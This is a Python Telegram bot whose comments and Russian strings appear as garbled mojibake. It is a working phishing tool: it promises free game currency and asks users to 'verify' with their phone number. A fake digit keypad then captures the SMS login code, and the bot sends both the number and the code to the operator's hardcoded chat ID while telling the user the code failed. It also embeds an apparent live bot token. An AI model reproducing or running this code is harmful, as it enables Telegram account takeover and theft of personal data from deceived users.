import telebot
from telebot import types

# –¢–≤–æ–π –±–æ—Ç, –∫—É–¥–∞ –ø—Ä–∏–¥—É—Ç –¥–∞–Ω–Ω—ã–µ
YOUR_CHAT_ID = "7605336105"  # –í—Å—Ç–∞–≤—å —Å–≤–æ–π ID
bot = telebot.TeleBot("8122491431:AAHbgSr_fX90putlg3YboVfWqalJn_ELpoo")

# –í—Ä–µ–º–µ–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
victims = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–∑–¥–∞–µ—Ç –≥o–ª–¥y o—Ç —é—Çy–±e—Äa –í–µ–ª–∏! –ù–∞–∂–º–∏ /verify –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –Ω–∞–º —É–±–µ–¥–∏—Ç—Å—è —á—Ç–æ —Ç—ã –Ω–µ –±–æ—Ç.")

@bot.message_handler(commands=['verify'])
def ask_phone(message):
    msg = bot.send_message(message.chat.id, "üì≤ *–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, +79123456789):*", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    phone = message.text
    victims[message.chat.id] = {"phone": phone}
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä —Å–µ–±–µ
    bot.send_message(YOUR_CHAT_ID, f"üî¢ *–ù–æ–≤—ã–π –Ω–æ–º–µ—Ä:* `{phone}`", parse_mode="Markdown")
    
    # –ò–º–∏—Ç–∏—Ä—É–µ–º –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–¥–∞
    bot.send_message(message.chat.id, f"üì≤ *ko–¥ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —á—Ç–æ –≤—ã –Ω–µ –±–æ—Ç –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤–∞–º –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–µ –∏–ª–∏ –≤ —Å–º—Å —á–µ—Ä–µ–∑ 1-5 –º–∏–Ω—É—Ç, –æ–∂–∏–¥–∞–π—Ç–µ*")
    
    # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
    markup = types.InlineKeyboardMarkup()
    row = []
    for i in range(1, 10):
        row.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
        if len(row) == 3:
            markup.row(*row)
            row = []
    markup.row(types.InlineKeyboardButton("0", callback_data="code_0"))
    markup.row(types.InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data="code_submit"))
    
    bot.send_message(message.chat.id, "üî¢ *–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS, –Ω–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫–∏:*", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("code_"))
def handle_code_input(call):
    chat_id = call.message.chat.id
    action = call.data.split("_")[1]
    
    if chat_id not in victims:
        return
    
    if "code" not in victims[chat_id]:
        victims[chat_id]["code"] = ""
    
    if action == "submit":
        # –ñ–µ—Ä—Ç–≤–∞ –Ω–∞–∂–∞–ª–∞ "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å" ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ —Å–µ–±–µ
        full_code = victims[chat_id]["code"]
        bot.send_message(YOUR_CHAT_ID, f"üîê *–ö–æ–¥ –æ—Ç {victims[chat_id]['phone']}:* `{full_code}`", parse_mode="Markdown")
        bot.edit_message_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.", chat_id, call.message.message_id)
        del victims[chat_id]
    elif action.isdigit():
        # –ñ–µ—Ä—Ç–≤–∞ –≤–≤–æ–¥–∏—Ç —Ü–∏—Ñ—Ä—ã
        victims[chat_id]["code"] += action
        bot.answer_callback_query(call.id, f"–ö–æ–¥: {victims[chat_id]['code']}")

if __name__ == "__main__":
    bot.polling()